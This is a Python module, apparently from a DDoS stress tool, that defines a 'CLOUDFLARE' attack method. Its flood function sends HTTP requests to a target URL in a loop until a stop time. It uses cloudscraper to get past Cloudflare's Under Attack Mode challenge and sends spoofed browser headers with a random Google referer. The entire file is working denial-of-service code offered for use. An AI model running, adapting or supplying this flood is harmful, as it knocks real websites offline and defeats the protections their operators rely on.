'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, requests, cloudscraper
from src.core import Core
from src.utils import *
from src.useragent import *

session = requests.session()

keyword = choice(keywords)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': f'https://google.com?q={keyword}',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
}

def flood(attack_id, url, stoptime) -> None:

    with cloudscraper.create_scraper() as session:
        while time.time() < stoptime and not Core.killattack:
            if not Core.attackrunning:
                continue
            
            try:

                req = session.get(
                    url, 
                    headers=headers,
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None
                )

                if req.status_code == 403: # blocked
                    Core.infodict[attack_id]['req_fail'] += 1
                    break

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1
            
            except cloudscraper.exceptions.CloudflareChallengeError: # cloudscraper is unable to solve v2 challenges
                Core.infodict[attack_id]['req_fail'] += 1
                Core.killattack = True # no need to start a new thread to attack it

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1

    Core.threadcount -= 1

Core.methods.update({
    'CLOUDFLARE': {
        'info': 'Cloudflare UAM/IUAM bypass using cloudscraper',
        'func': flood
    }
})